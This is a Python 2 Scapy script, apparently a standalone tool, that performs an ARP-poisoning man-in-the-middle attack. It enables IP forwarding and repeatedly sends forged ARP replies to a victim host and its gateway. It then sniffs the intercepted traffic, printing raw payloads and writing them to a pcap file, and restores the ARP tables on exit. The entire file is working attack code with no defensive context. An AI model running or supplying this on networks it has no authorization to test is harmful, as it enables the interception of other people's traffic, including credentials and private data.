from scapy.all import *
import sys
import os
import time

global interface

def help_text():
    print("\nUsage:\n python mitm.py network_range\n")
    sys.exit()

def enable_ip_forwarding():
    print "\n[*] Enabling IP Forwarding...\n"
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def disable_ip_forwarding():
    print "[*] Disabling IP Forwarding..."
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def get_mac(IP):
    conf.verb = 0
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
    for snd,rcv in ans:
        mac=rcv.sprintf(r"%Ether.src%")
        print "ip(%s) => mac(%s)"%(IP, mac)
        return mac

def reARP():
    print "\n[*] Restoring Targets..."
    victimMAC = get_mac(victimIP)
    gatewayMAC = get_mac(gatewayIP)
    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gatewayMAC), count = 7)
    disable_ip_forwarding()
    print "[*] Shutting Down..."
    sys.exit(1)

def trick(gm, vm):
    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst= vm))
    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst= gm))

def sniffer():
    global interface
    pkts = sniff(iface = interface, count = 10, prn=lambda x:x.sprintf(" Source: %IP.src% : %Ether.src%, \n %Raw.load% \n\n Reciever: %IP.dst% \n +=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+\n"))
    wrpcap("temp.pcap", pkts)

def mitm():
    try:
        victimMAC = get_mac(victimIP)
    except Exception:
        disable_ip_forwarding()
        print "[!] Couldn't Find Victim MAC Address"
        print "[!] Exiting..."
        sys.exit(1)
    try:
        gatewayMAC = get_mac(gatewayIP)
    except Exception:
        disable_ip_forwarding()
        print "[!] Couldn't Find Gateway MAC Address"
        print "[!] Exiting..."
        sys.exit(1)
    print "[*] Poisoning Targets..."    
    while 1:
        try:
            trick(gatewayMAC, victimMAC)
            time.sleep(1.5)
            sniffer()
        except KeyboardInterrupt:
            reARP()
            break

if __name__ == '__main__':
    if len(sys.argv) < 2:
        help_text()
    interface = sys.argv[1]
    victimIP = sys.argv[2]
    gatewayIP = sys.argv[3] 
    enable_ip_forwarding()
    mitm()